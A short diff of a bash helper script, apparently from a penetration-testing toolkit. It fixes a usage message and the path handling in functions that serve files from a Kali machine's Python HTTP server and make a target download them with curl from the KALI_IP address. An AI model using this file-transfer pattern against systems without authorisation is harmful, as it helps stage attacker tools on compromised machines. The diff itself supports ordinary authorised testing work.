@@ -48,7 +48,7 @@ curl_download() {
     local location="$2"
 
     if [[ -z "$1" ||  -z "$2" ]]; then
-        paste_command 'Usage: webclient_download "url" "location"'
+        paste_command 'Usage: curl_download "url" "location"'
         exit 1
     fi
 
@@ -95,7 +95,11 @@ curl_upload_file() {
     start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"
 
     curl_download "http://${KALI_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"
-    xdotool key Return
+
+    # if location is without path add ./ prefix
+    if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
+        FILE_LOCATION="./${FILE_LOCATION}"
+    fi
 }
 
 show_notify_message () {
